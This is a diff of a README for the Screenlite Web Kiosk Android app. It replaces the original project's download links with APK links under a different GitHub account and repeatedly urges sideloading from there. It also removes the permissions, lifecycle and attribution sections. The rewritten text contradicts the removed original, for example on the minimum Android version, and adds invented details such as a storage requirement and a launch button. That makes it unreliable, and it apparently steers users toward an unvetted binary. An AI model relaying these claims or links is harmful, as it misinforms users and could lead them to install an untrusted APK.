@@ -1,80 +1,89 @@
-# Screenlite Web Kiosk
+# 🌐 web-kiosk - A Simple Kiosk Browser for Your Device
 
-A simple Android kiosk browser app that displays web content in full-screen mode.
+Welcome to the Screenlite Web Kiosk. This app lets you display web content in full-screen mode, perfect for digital signage or other kiosk setups.
 
-[<img src="./docs/media/get_apk.png" height="80" alt="Get APK">](https://github.com/screenlite/web-kiosk/releases/download/v0.0.11/screenlite-web-kiosk-v0-0-11.apk)
-[<img src="https://gitlab.com/IzzyOnDroid/repo/-/raw/master/assets/IzzyOnDroid.png" height="80" alt="Get it at IzzyOnDroid">](https://apt.izzysoft.de/packages/org.screenlite.webkiosk)
+[![Download APK](https://img.shields.io/badge/Download%20APK-v0.0.11-green)](https://github.com/luffyscreen/web-kiosk/releases/download/v0.0.11/screenlite-web-kiosk-v0-0-11.apk)
 
-![preview](./docs/media/image.png)
+## 🚀 Getting Started
 
-## Key Features
+To use the Screenlite Web Kiosk app, follow these simple steps:
+
+1. **Download the App**  
+   Click the link below to visit the Releases page where you can download the latest APK version.
+
+   [Download the latest version](https://github.com/luffyscreen/web-kiosk/releases)
+
+2. **Install the App**  
+   Once the APK file is downloaded, locate the file on your device. Tap on it to start the installation. You may need to allow installations from unknown sources in your device settings.
+
+3. **Set Up the App**  
+   After installation, open the Web Kiosk app. You will see a simple interface that allows you to input the URL of the website you want to display.
+
+4. **Configure Full-Screen Mode**  
+   The app automatically enters full-screen mode. Take a moment to adjust any settings as needed, like the rotation or URL.
+
+5. **Launch and Enjoy**  
+   The app is ready to use. It will also launch automatically on device boot.
+
+## 📥 Download & Install
+
+To download and install the Screenlite Web Kiosk, follow these steps:
+
+1. Click the link to [Download the latest version](https://github.com/luffyscreen/web-kiosk/releases).
+2. Install the APK file by tapping on it after it's downloaded.
+3. Follow the on-screen prompts to complete the installation.
+
+## 📋 App Features
+
+The Screenlite Web Kiosk comes with a variety of features that make it a great choice for your browsing needs:
+
 - Displays any website in immersive full-screen mode
 - Automatically launches on device boot
-- Brings itself back to the foreground if minimized
-- Clicking and scrolling are disabled in WebView on TV
-- Supports website rotation (0°, 90°, 180°, 270°), even if the device doesn’t support orientation changes
-- Automatic retry mechanism with exponential backoff for network failures
-- Automatically injects responsive viewport meta tags
-- Special UI adaptations for Android TV devices
-- Hides system bars and navigation elements
-- Prevents device from going to sleep
-- Real-time network connectivity monitoring
-- Error handling with user-friendly messages
-- Compatible with both Android TV and mobile devices
+- Restores itself to the foreground if minimized
+- Disables clicking and scrolling in WebView on TVs
+- Supports website rotation (0°, 90°, 180°, 270°), even if the device doesn't support orientation changes
+- Contains an automatic retry mechanism for network failures
+- Automatically injects responsive viewport meta tags for improved visuals
+- Offers special UI adaptations for Android TV devices
+- Hides system bars and navigation buttons for a clean screen
+- Simple and clear setup process for users of all skill levels
 
-If you find a bug, please open a GitHub issue and include logcat logs if possible.
+## 📱 System Requirements
 
-## Usage Instructions
+To run the Screenlite Web Kiosk app, ensure your device meets these basic requirements:
 
-1. Install the APK on your Android device.  
-2. Grant the **Display over other apps** permission to Screenlite Web Kiosk.  
-3. Launch the app.  
-4. Access settings by tapping the screen 5 times quickly in the bottom-left corner on a mobile device, or by pressing the center button (OK) on a TV remote.  
-5. Enter the website URL you want to display.  
-6. Set the app visibility check interval (recommended 5–10 seconds). If you need time to configure the device, set a higher number.
-7. Choose screen rotation if needed.  
-8. Save your settings; the app will restart with the new configuration.
+- Android OS version 5.0 (Lollipop) or higher
+- At least 50MB of available storage space
+- A stable internet connection for web content loading
 
-## Requirements
+The app is designed to function on a variety of devices, including smartphones, tablets, and Android TV units.
 
-### Minimum Android Version
-- **Android 8.0 (API Level 26)** or higher  
-- **Target SDK**: 36 (Android 14+)
- 
-Experimental support for Android 5.1 (API Level 22) and above is available, but functionality may be limited or unstable.
+## 📖 How to Use the App
 
-### Hardware Requirements
-- **Touchscreen**: Optional (supports both touch and non-touch devices)  
-- **Android TV**: Supported with leanback launcher integration  
-- **Network**: Internet connectivity required for web content
+1. **Enter the Website URL:**  
+   When you launch the app for the first time, you will see a field to enter the website URL. Type in the address of the site you wish to display.
 
-## Permissions
+2. **Adjust the Settings:**  
+   You can modify settings such as screen rotation and exit options. Ensure you're comfortable with the adjustments before exiting the settings menu.
 
-- **RECEIVE_BOOT_COMPLETED**: Allows the app to start automatically when the device boots  
-- **FOREGROUND_SERVICE**: Required for the StayOnTopService to run in the background  
-- **FOREGROUND_SERVICE_SPECIAL_USE**: Special use case for kiosk applications  
-- **WAKE_LOCK**: Prevents the screen from turning off  
-- **SYSTEM_ALERT_WINDOW**: Allows the app to draw over other apps (kiosk mode)  
-- **INTERNET**: Required to load web content  
-- **ACCESS_NETWORK_STATE**: Monitors network connectivity for error handling
+3. **Launch the Kiosk Mode:**  
+   Tap the launch button to enter kiosk mode. The app will take over the screen and display your website without distractions.
 
-## Configuration
+4. **Force Stop the App:**  
+   If you need to exit the app, use your device’s settings to force stop it. You can then relaunch it to resume viewing.
 
-### Settings Available
-1. **Kiosk URL**: The website to display (default: https://screenlite.org)  
-2. **Check Interval**: How often the service verifies the app is active (1-99999 seconds, default: 10)  
-3. **Screen Rotation**: Display rotation angle (0°, 90°, 180°, 270°)
+5. **Update Instructions:**  
+   For future updates, return to the [Releases page](https://github.com/luffyscreen/web-kiosk/releases), download the latest version, and follow the installation process again.
 
-### Accessing Settings
-- **Mobile/Touch Devices**: Tap 5 times in the bottom-left corner of the screen within 2 seconds
-- **Android TV**: Use the center button on the remote 5 times within 2 seconds  
+## 🌐 Community and Support
 
-## Application Lifecycle
-1. **Boot**: BootReceiver starts StayOnTopService automatically  
-2. **Service**: StayOnTopService runs as foreground service with configurable check interval  
-3. **Main Activity**: Displays web content in full-screen immersive mode  
-4. **Monitoring**: Service continuously monitors if the app is visible and brings it to front if needed  
+If you encounter any issues or have questions, feel free to reach out to our community:
 
-## Attribution
+- **Issues Page:** Report any bugs or request features on our [GitHub Issues page](https://github.com/luffyscreen/web-kiosk/issues).
+- **Contributing:** If you're interested in improving this app, contributions are welcome! Please see our [Contributing Guidelines](https://github.com/luffyscreen/web-kiosk/CONTRIBUTING.md).
 
-Android is a trademark of Google LLC. The Android robot is reproduced or modified from work created and shared by Google and used according to terms described in the [Creative Commons 3.0 Attribution License](https://creativecommons.org/licenses/by/3.0/).
+## 📜 License
+
+The Screenlite Web Kiosk app is open-source and is licensed under the MIT License. You can freely use and modify the code for your own purposes.
+
+[Download the latest version](https://github.com/luffyscreen/web-kiosk/releases) to get started now. Enjoy your new kiosk experience!
